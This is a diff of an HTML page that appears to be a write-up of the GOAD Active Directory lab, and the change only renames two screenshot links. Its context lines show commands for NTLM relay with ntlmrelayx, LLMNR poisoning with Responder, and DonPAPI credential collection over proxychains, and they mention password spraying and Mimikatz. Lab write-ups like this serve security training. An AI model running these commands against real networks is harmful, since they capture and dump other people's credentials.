@@ -734,7 +734,7 @@
 <p>SMB relay with <code>ntlmrelayx</code>:</p>
 <div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-l<span class="w"> </span>dumps/loot<span class="w"> </span>-smb2support<span class="w"> </span>-socks<span class="w"> </span>--keep-relaying
 </code></pre></div>
-<p><img alt="Pasted image 20250206143552.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250206143552.png"/></p>
+<p><img alt="north-llmnr-poisoning-smb-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-llmnr-poisoning-smb-relay.png"/></p>
 <h2 id="llmnr-poisoning">LLMNR Poisoning</h2>
 <p>Poison DNS and capture NTLMv2 hashes:</p>
 <div class="highlight"><pre><span></span><code>sudo ./Responder.py -I eth0 -v
@@ -762,7 +762,7 @@
 <p>Using relayed credentials:</p>
 <div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>donpapi<span class="w"> </span>collect<span class="w"> </span>--no-pass<span class="w"> </span>-u<span class="w"> </span>eddard.stark<span class="w"> </span>-d<span class="w"> </span>NORTH<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.22
 </code></pre></div>
-<p><img alt="Pasted image 20250206143924.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250206143924.png"/></p>
+<p><img alt="north-smb-relay-credential-dumping.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-smb-relay-credential-dumping.png"/></p>
 <p>By performing password spraying, the password <code>` belongs to</code>sql_svc`</p>
 <h2 id="mimikatz">Mimikatz</h2>
 <p>With <code>eddard.stark</code> (domain admin):</p>
